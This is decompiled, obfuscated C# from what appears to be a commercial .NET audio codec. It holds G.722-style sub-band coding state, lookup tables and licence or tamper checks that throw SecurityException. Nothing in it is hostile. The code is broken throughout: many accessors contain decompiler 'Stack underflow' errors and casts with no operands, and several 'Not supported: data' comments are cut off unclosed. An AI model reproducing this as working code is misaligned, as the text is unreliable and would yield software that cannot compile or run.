				2543, 2599, 2656, 2714, 2774, 2834, 2896, 2960, 3025, 3091,
				3158, 3228, 3298, 3371, 3444, 3520, 3597, 3676, 3756, 3838,
				3922, 4008
			};
			_0004 = new int[3] { 0, -214, 798 };
			_0005 = new int[4] { 2, 1, 2, 1 };
			_0006 = new int[4] { -7408, -1616, 7408, 1616 };
			_0007 = new int[16]
			{
				0, -20456, -12896, -8968, -6288, -4240, -2584, -1200, 20456, 12896,
				8968, 6288, 4240, 2584, 1200, 0
			};
			_0008 = new int[32]
			{
				-280, -280, -23352, -17560, -14120, -11664, -9752, -8184, -6864, -5712,
				-4696, -3784, -2960, -2208, -1520, -880, 23352, 17560, 14120, 11664,
				9752, 8184, 6864, 5712, 4696, 3784, 2960, 2208, 1520, 880,
				280, -280
			};
			_000E = new int[64]
			{
				-136, -136, -136, -136, -24808, -21904, -19008, -16704, -14984, -13512,
				-12280, -11192, -10232, -9360, -8576, -7856, -7192, -6576, -6000, -5456,
				-4944, -4464, -4008, -3576, -3168, -2776, -2400, -2032, -1688, -1360,
				-1040, -728, 24808, 21904, 19008, 16704, 14984, 13512, 12280, 11192,
				10232, 9360, 8576, 7856, 7192, 6576, 6000, 5456, 4944, 4464,
				4008, 3576, 3168, 2776, 2400, 2032, 1688, 1360, 1040, 728,
				432, 136, -432, -136
			};
			_000F = new int[12]
			{
				3, -11, 12, 32, -210, 951, 3876, -805, 362, -156,
				53, -11
			};
			_0010 = new int[32]
			{
				0, 35, 72, 110, 150, 190, 233, 276, 323, 370,
				422, 473, 530, 587, 650, 714, 786, 858, 940, 1023,
				1121, 1219, 1339, 1458, 1612, 1765, 1980, 2195, 2557, 2919,
				0, 0
			};
			_0011 = new int[32]
			{
				0, 63, 62, 31, 30, 29, 28, 27, 26, 25,
				24, 23, 22, 21, 20, 19, 18, 17, 16, 15,
				14, 13, 12, 11, 10, 9, 8, 7, 6, 5,
				4, 0
			};
			_0012 = new int[32]
			{
				0, 61, 60, 59, 58, 57, 56, 55, 54, 53,
				52, 51, 50, 49, 48, 47, 46, 45, 44, 43,
				42, 41, 40, 39, 38, 37, 36, 35, 34, 33,
				32, 0
			};
			_0013 = new int[3] { 0, 1, 0 };
			_0014 = new int[3] { 0, 3, 2 };
		}
	}
}
namespace _0001
{
	internal sealed class _0017
	{
		[CompilerGenerated]
		private bool _0001;

		[CompilerGenerated]
		private bool _0002;

		[CompilerGenerated]
		private bool _0003;

		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private int[] _0001;

		[CompilerGenerated]
		private global::_0011._0012[] _0001;

		[CompilerGenerated]
		private uint _0001;

		[CompilerGenerated]
		private int _0002;

		[CompilerGenerated]
		private uint _0002;

		[CompilerGenerated]
		private int _0003;

		public bool ItuTestMode
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public bool Packed
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public bool EncodeFrom8000Hz
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0003 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public int BitsPerSample
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int[] QmfSignalHistory
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0001 = (int[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0011._0012[] Band
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0011._0012[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public uint InBuffer
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0001 = (uint)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int InBits
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public uint OutBuffer
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0002 = (uint)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int OutBits
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0017)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0017)/*Error near IL_0009: Stack underflow*/)._0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0017(int _0005_0080, global::_0015._0014 _0005_0092_0006)
		{
			Band = new global::_0011._0012[2]
			{
				new global::_0011._0012(),
				new global::_0011._0012()
			};
			QmfSignalHistory = new int[24];
			ItuTestMode = false;
			switch (_0005_0080)
			{
			case 48000:
				BitsPerSample = 6;
				break;
			case 56000:
				BitsPerSample = 7;
				break;
			case 64000:
				BitsPerSample = 8;
				break;
			default:
				throw new ArgumentException(global::_0080._0014._0001(107405797));
			}
			if ((_0005_0092_0006 & global::_0015._0014._0002) == global::_0015._0014._0002)
			{
				EncodeFrom8000Hz = true;
			}
			if ((_0005_0092_0006 & global::_0015._0014._0003) == global::_0015._0014._0003 && BitsPerSample != 8)
			{
				Packed = true;
			}
			else
			{
				Packed = false;
			}
			Band[0]._0005 = 32;
			Band[1]._0005 = 8;
		}
	}
}
namespace _0011
{
	internal sealed class _0012
	{
		public int _0001;

		public int _0002;

		public int _0003;

		public int[] _0001 = new int[3];

		public int[] _0002 = new int[3];

		public int[] _0003 = new int[3];

		public int[] _0004 = new int[3];

		public int[] _0005 = new int[7];

		public int[] _0006 = new int[7];

		public int[] _0007 = new int[7];

		public int[] _0008 = new int[7];

		public int _0004;

		public int _0005;

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	[Flags]
	internal enum _0014
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2
	}
}
namespace _007F
{
	internal static class _0016
	{
		internal static readonly short[] _0001;

		static _0016()
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = new short[256]
			{
				-32124, -31100, -30076, -29052, -28028, -27004, -25980, -24956, -23932, -22908,
				-21884, -20860, -19836, -18812, -17788, -16764, -15996, -15484, -14972, -14460,
				-13948, -13436, -12924, -12412, -11900, -11388, -10876, -10364, -9852, -9340,
				-8828, -8316, -7932, -7676, -7420, -7164, -6908, -6652, -6396, -6140,
				-5884, -5628, -5372, -5116, -4860, -4604, -4348, -4092, -3900, -3772,
				-3644, -3516, -3388, -3260, -3132, -3004, -2876, -2748, -2620, -2492,
				-2364, -2236, -2108, -1980, -1884, -1820, -1756, -1692, -1628, -1564,
				-1500, -1436, -1372, -1308, -1244, -1180, -1116, -1052, -988, -924,
				-876, -844, -812, -780, -748, -716, -684, -652, -620, -588,
				-556, -524, -492, -460, -428, -396, -372, -356, -340, -324,
				-308, -292, -276, -260, -244, -228, -212, -196, -180, -164,
				-148, -132, -120, -112, -104, -96, -88, -80, -72, -64,
				-56, -48, -40, -32, -24, -16, -8, -1, 32124, 31100,
				30076, 29052, 28028, 27004, 25980, 24956, 23932, 22908, 21884, 20860,
				19836, 18812, 17788, 16764, 15996, 15484, 14972, 14460, 13948, 13436,
				12924, 12412, 11900, 11388, 10876, 10364, 9852, 9340, 8828, 8316,
				7932, 7676, 7420, 7164, 6908, 6652, 6396, 6140, 5884, 5628,
				5372, 5116, 4860, 4604, 4348, 4092, 3900, 3772, 3644, 3516,
				3388, 3260, 3132, 3004, 2876, 2748, 2620, 2492, 2364, 2236,
				2108, 1980, 1884, 1820, 1756, 1692, 1628, 1564, 1500, 1436,
				1372, 1308, 1244, 1180, 1116, 1052, 988, 924, 876, 844,
				812, 780, 748, 716, 684, 652, 620, 588, 556, 524,
				492, 460, 428, 396, 372, 356, 340, 324, 308, 292,
				276, 260, 244, 228, 212, 196, 180, 164, 148, 132,
				120, 112, 104, 96, 88, 80, 72, 64, 56, 48,
				40, 32, 24, 16, 8, 0
			};
			_0001 = (short[])/*Error near IL_0017: Stack underflow*/;
		}
	}
}
namespace _0007
{
	internal static class _0018
	{
		private const int _0001 = 132;

		private const int _0002 = 32635;

		internal static readonly byte[] _0001;

		static _0018()
		{
			//IL_00d3: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00d9: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0001 = new byte[256]
			{
				0, 0, 1, 1, 2, 2, 2, 2, 3, 3,
				3, 3, 3, 3, 3, 3, 4, 4, 4, 4,
				4, 4, 4, 4, 4, 4, 4, 4, 4, 4,
				4, 4, 5, 5, 5, 5, 5, 5, 5, 5,
				5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
				5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
				5, 5, 5, 5, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 6, 6,
				6, 6, 6, 6, 6, 6, 6, 6, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7, 7, 7, 7, 7,
				7, 7, 7, 7, 7, 7
			};
		}
	}
}
namespace _0005
{
	[CompilerGenerated]
	internal sealed class _0016
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct _0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 24)]
		private struct _0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 28)]
		private struct _0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 32)]
		private struct _0005
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 48)]
		private struct _0006
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 64)]
		private struct _0007
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 128)]
		private struct _0008
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 256)]
		private struct _000E
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 360)]
		private struct _000F
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 512)]
		private struct _0010
		{
		}

		internal static readonly _0003 _0001/* Not supported: data(80 01 00 00 80 04 00 00 80 04 00 00 80 01 00 00 80 04 00 00 40 02 00 00) */;

		internal static readonly _0008 _0001/* Not supported: data(00 08 00 00 2D 08 00 00 5B 08 00 00 8A 08 00 00 B9 08 00 00 EA 08 00 00 1C 09 00 00 4F 09 00 00 83 09 00 00 B9 09 00 00 EF 09 00 00 27 0A 00 00 60 0A 00 00 9A 0A 00 00 D6 0A 00 00 12 0B 00 00 50 0B 00 00 90 0B 00 00 D1 0B 00 00 13 0C 00 00 56 0C 00 00 9C 0C 00 00 E2 0C 00 00 2B 0D 00 00 74 0D 00 00 C0 0D 00 00 0D 0E 00 00 5C 0E 00 00 AC 0E 00 00 FE 0E 00 00 52 0F 00 00 A8 0F 00 00) */;

		internal static readonly _0001 _0001/* Not supported: data(11 2B 00 00 E0 2E 00 00 40 1F 00 00) */;

		internal static readonly _0006 _0001/* Not supported: data(03 00 00 00 F5 FF FF FF 0C 00 00 00 20 00 00 00 2E FF FF FF B7 03 00 00 24 0F 00 00 DB FC FF FF 6A 01 00 00 64 FF FF FF 35 00 00 00 F5 FF FF FF) */;

		internal static readonly _0010 _0001/* Not supported: data

		internal static readonly _0008 _0002/* Not supported: data(00 00 00 00 3D 00 00 00 3C 00 00 00 3B 00 00 00 3A 00 00 00 39 00 00 00 38 00 00 00 37 00 00 00 36 00 00 00 35 00 00 00 34 00 00 00 33 00 00 00 32 00 00 00 31 00 00 00 30 00 00 00 2F 00 00 00 2E 00 00 00 2D 00 00 00 2C 00 00 00 2B 00 00 00 2A 00 00 00 29 00 00 00 28 00 00 00 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 23 00 00 00 22 00 00 00 21 00 00 00 20 00 00 00 00 00 00 00) */;

		internal static readonly _0002 _0001/* Not supported: data(10 E3 FF FF B0 F9 FF FF F0 1C 00 00 50 06 00 00) */;

		internal static readonly _0002 _0002/* Not supported: data(02 00 00 00 01 00 00 00 02 00 00 00 01 00 00 00) */;

		internal static readonly _0007 _0001/* Not supported: data(00 00 00 00 07 00 00 00 06 00 00 00 05 00 00 00 04 00 00 00 03 00 00 00 02 00 00 00 01 00 00 00 07 00 00 00 06 00 00 00 05 00 00 00 04 00 00 00 03 00 00 00 02 00 00 00 01 00 00 00 00 00 00 00) */;

		internal static readonly _0008 _0003/* Not supported: data(01 01 02 02 03 03 03 03 04 04 04 04 04 04 04 04 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07) */;

		internal static readonly _0004 _0001/* Not supported: data(00 01 00 00 00 02 00 FF 00 00 00 00 C0 00 40 00 F0 00 00 00 CC 01 30 FF 88 01 18 FF) */;

		internal static readonly _000E _0001/* Not supported: data(00 00 01 01 02 02 02 02 03 03 03 03 03 03 03 03 04 04 04 04 04 04 04 04 04 04 04 04 04 04 04 04 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 05 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07 07) */;

		internal static readonly _0007 _0002/* Not supported: data(00 00 00 00 18 B0 FF FF A0 CD FF FF F8 DC FF FF 70 E7 FF FF 70 EF FF FF E8 F5 FF FF 50 FB FF FF E8 4F 00 00 60 32 00 00 08 23 00 00 90 18 00 00 90 10 00 00 18 0A 00 00 B0 04 00 00 00 00 00 00) */;

		internal static readonly _000E _0002/* Not supported: data(78 FF FF FF 78 FF FF FF 78 FF FF FF 78 FF FF FF 18 9F FF FF 70 AA FF FF C0 B5 FF FF C0 BE FF FF 78 C5 FF FF 38 CB FF FF 08 D0 FF FF 48 D4 FF FF 08 D8 FF FF 70 DB FF FF 80 DE FF FF 50 E1 FF FF E8 E3 FF FF 50 E6 FF FF 90 E8 FF FF B0 EA FF FF B0 EC FF FF 90 EE FF FF 58 F0 FF FF 08 F2 FF FF A0 F3 FF FF 28 F5 FF FF A0 F6 FF FF 10 F8 FF FF 68 F9 FF FF B0 FA FF FF F0 FB FF FF 28 FD FF FF E8 60 00 00 90 55 00 00 40 4A 00 00 40 41 00 00 88 3A 00 00 C8 34 00 00 F8 2F 00 00 B8 2B 00 00 F8 27 00 00 90 24 00 00 80 21 00 00 B0 1E 00 00 18 1C 00 00 B0 19 00 00 70 17 00 00 50 15 00 00 50 13 00 00 70 11 00 00 A8 0F 00 00 F8 0D 00 00 60 0C 00 00 D8 0A 00 00 60 09 00 00 F0 07 00 00 98 06 00 00 50 05 00 00 10 04 00 00 D8 02 00 00 B0 01 00 00 88 00 00 00 50 FE FF FF 78 FF FF FF) */;

		internal static readonly _0008 _0004/* Not supported: data(00 00 00 00 23 00 00 00 48 00 00 00 6E 00 00 00 96 00 00 00 BE 00 00 00 E9 00 00 00 14 01 00 00 43 01 00 00 72 01 00 00 A6 01 00 00 D9 01 00 00 12 02 00 00 4B 02 00 00 8A 02 00 00 CA 02 00 00 12 03 00 00 5A 03 00 00 AC 03 00 00 FF 03 00 00 61 04 00 00 C3 04 00 00 3B 05 00 00 B2 05 00 00 4C 06 00 00 E5 06 00 00 BC 07 00 00 93 08 00 00 FD 09 00 00 67 0B 00 00 00 00 00 00 00 00 00 00) */;

		internal static readonly _000F _0001/* Not supported: data(00 00 00 00 20 00 00 00 40 00 00 00 60 00 00 00 80 00 00 00 A0 00 00 00 C0 00 00 00 E0 00 00 00 00 01 00 00 20 01 00 00 40 01 00 00 60 01 00 00 80 01 00 00 A0 01 00 00 C0 01 00 00 00 00 00 00 20 00 00 00 30 00 00 00 38 00 00 00 40 00 00 00 50 00 00 00 60 00 00 00 70 00 00 00 80 00 00 00 A0 00 00 00 C0 00 00 00 E0 00 00 00 00 01 00 00 40 01 00 00 80 01 00 00 00 00 00 00 20 00 00 00 28 00 00 00 30 00 00 00 38 00 00 00 40 00 00 00 50 00 00 00 60 00 00 00 70 00 00 00 80 00 00 00 A0 00 00 00 C0 00 00 00 E0 00 00 00 00 01 00 00 40 01 00 00 00 00 00 00 20 00 00 00 30 00 00 00 38 00 00 00 40 00 00 00 50 00 00 00 60 00 00 00 70 00 00 00 80 00 00 00 90 00 00 00 A0 00 00 00 B0 00 00 00 C0 00 00 00 E0 00 00 00 00 01 00 00 00 00 00 00 08 00 00 00 10 00 00 00 18 00 00 00 20 00 00 00 28 00 00 00 30 00 00 00 38 00 00 00 40 00 00 00 50 00 00 00 60 00 00 00 70 00 00 00 80 00 00 00 90 00 00 00 A0 00 00 00 00 00 00 00 08 00 00 00 10 00 00 00 18 00 00 00 20 00 00 00 28 00 00 00 30 00 00 00 38 00 00 00 40 00 00 00 50 00 00 00 60 00 00 00 70 00 00 00 80 00 00 00 90 00 00 00 A0 00 00 00) */;

		internal static readonly _0010 _0002/* Not supported: data

		internal static readonly _0008 _0005/* Not supported: data(E8 FE FF FF E8 FE FF FF C8 A4 FF FF 68 BB FF FF D8 C8 FF FF 70 D2 FF FF E8 D9 FF FF 08 E0 FF FF 30 E5 FF FF B0 E9 FF FF A8 ED FF FF 38 F1 FF FF 70 F4 FF FF 60 F7 FF FF 10 FA FF FF 90 FC FF FF 38 5B 00 00 98 44 00 00 28 37 00 00 90 2D 00 00 18 26 00 00 F8 1F 00 00 D0 1A 00 00 50 16 00 00 58 12 00 00 C8 0E 00 00 90 0B 00 00 A0 08 00 00 F0 05 00 00 70 03 00 00 18 01 00 00 E8 FE FF FF) */;

		internal static readonly _0001 _0002/* Not supported: data(22 56 00 00 C0 5D 00 00 80 3E 00 00) */;

		internal static readonly _0001 _0003/* Not supported: data(44 AC 00 00 80 BB 00 00 00 7D 00 00) */;

		internal static readonly _0008 _0006/* Not supported: data(00 00 00 00 3F 00 00 00 3E 00 00 00 1F 00 00 00 1E 00 00 00 1D 00 00 00 1C 00 00 00 1B 00 00 00 1A 00 00 00 19 00 00 00 18 00 00 00 17 00 00 00 16 00 00 00 15 00 00 00 14 00 00 00 13 00 00 00 12 00 00 00 11 00 00 00 10 00 00 00 0F 00 00 00 0E 00 00 00 0D 00 00 00 0C 00 00 00 0B 00 00 00 0A 00 00 00 09 00 00 00 08 00 00 00 07 00 00 00 06 00 00 00 05 00 00 00 04 00 00 00 00 00 00 00) */;

		internal static readonly _0002 _0003/* Not supported: data(44 AC 00 00 80 BB 00 00 00 7D 00 00 9F 86 01 00) */;

		internal static readonly _0005 _0001/* Not supported: data(C4 FF FF FF E2 FF FF FF 3A 00 00 00 AC 00 00 00 4E 01 00 00 1A 02 00 00 AE 04 00 00 E2 0B 00 00) */;
	}
}
namespace _0019
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _001B : Attribute
	{
	}
}
namespace _0003
{
	internal sealed class _0012
	{
	}
}
namespace _001A
{
	internal sealed class _0015
	{
		internal struct _0001
		{
			public string _0001;

			public Version _0001;

			public string _0002;

			public string _0003;

			public string _0001(bool _0002)
			{
				//IL_00ab: Incompatible stack heights: 0 vs 1
				//IL_00b7: Incompatible stack heights: 0 vs 1
				new StringBuilder();
				StringBuilder stringBuilder = (StringBuilder)/*Error near IL_00b1: Stack underflow*/;
				string value = this._0001;
				((StringBuilder)/*Error near IL_001a: Stack underflow*/).Append(value);
				if (_0002 && this._0001 != null)
				{
					stringBuilder.Append(", Version=");
					stringBuilder.Append(this._0001);
				}
				stringBuilder.Append(", Culture=");
				stringBuilder.Append((this._0002.Length == 0) ? "neutral" : this._0002);
				stringBuilder.Append(", PublicKeyToken=");
				stringBuilder.Append((_0003.Length == 0) ? "null" : _0003);
				return stringBuilder.ToString();
			}

			public _0001(string _0094_0003)
			{
				this._0001 = null;
				_0002 = string.Empty;
				_0003 = string.Empty;
				this._0001 = string.Empty;
				string[] array = _0094_0003.Split(new char[1] { ',' });
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i].Trim();
					if (text.StartsWith("Version="))
					{
						this._0001 = new Version(text.Substring(8));
					}
					else if (text.StartsWith("Culture="))
					{
						_0002 = text.Substring(8);
						if (_0002 == "neutral")
						{
							_0002 = string.Empty;
						}
					}
					else if (text.StartsWith("PublicKeyToken="))
					{
						_0003 = text.Substring(15);
						if (_0003 == "null")
						{
							_0003 = string.Empty;
						}
					}
					else
					{
						this._0001 = text;
					}
				}
			}
		}

		internal const string _0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";

		private const int m__0001 = 4;

		internal static Dictionary<string, Assembly> _0001;

		internal static bool IsWebApplication
		{
			get
			{
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				try
				{
					Process.GetCurrentProcess();
					_ = ((Process)/*Error near IL_003c: Stack underflow*/).MainModule;
					_ = ((ProcessModule)/*Error near IL_0043: Stack underflow*/).ModuleName;
					string text = ((string)/*Error near IL_000b: Stack underflow*/).ToLower();
					if (text == "w3wp.exe")
					{
						return true;
					}
					if (text == "aspnet_wp.exe")
					{
						return true;
					}
				}
				catch
				{
				}
				return false;
			}
		}

		static _0015()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			new Dictionary<string, Assembly>();
			_0015._0001 = (Dictionary<string, Assembly>)/*Error near IL_0007: Stack underflow*/;
		}
	}
}
namespace _0018
{
	internal sealed class _0019
	{
	}
}
namespace _0001
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0014
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0014 : Attribute
	{
	}
}
namespace _007F
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0017 : Attribute
	{
	}
}
namespace _001B
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0017 : Attribute
	{
	}
}
namespace _001A
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0016 : Attribute
	{
	}
}
namespace _0010
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method)]
	internal sealed class _001B : Attribute
	{
	}
}
namespace _0003
{
	internal sealed class _0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0001
		{
		}

		internal static readonly _0001 _0001/* Not supported: data(01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 0E 00 0F 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1A 00 1B 00 1C 00 1D 00 1E 00 1F 00 7F 00 80 00 81 00 82 00 83 00 84 00 86 00 87 00 88 00 89 00 8A 00 8B 00 8C 00 8D 00 8E 00 8F 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9A 00 9B 00 9C 00 9D 00 9E 00 9F 00) */;
	}
}
namespace _0017
{
	internal sealed class _001F
	{
	}
}
namespace _0002
{
	internal sealed class _0017
	{
		private static Assembly m__0001 = null;

		private static string[] m__0001 = new string[0];

